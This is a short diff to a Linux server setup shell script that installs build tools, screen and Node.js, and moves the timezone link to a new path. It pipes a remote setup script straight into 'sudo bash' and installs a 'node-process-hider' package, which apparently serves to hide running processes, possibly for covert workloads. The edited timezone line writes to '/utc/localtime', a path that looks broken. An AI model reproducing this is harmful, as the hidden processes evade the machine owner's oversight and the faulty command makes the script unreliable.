@@ -4,10 +4,9 @@
 apt update && apt -y install sudo wget curl unzip
 sudo apt update && apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-apt-get install nsolid -y
 apt-get install -y nodejs
 npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Germany/Gotha /etc/localtime
+ln -fs /usr/share/zoneinfo/Asia/Singapore /utc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 # Download and extract required files
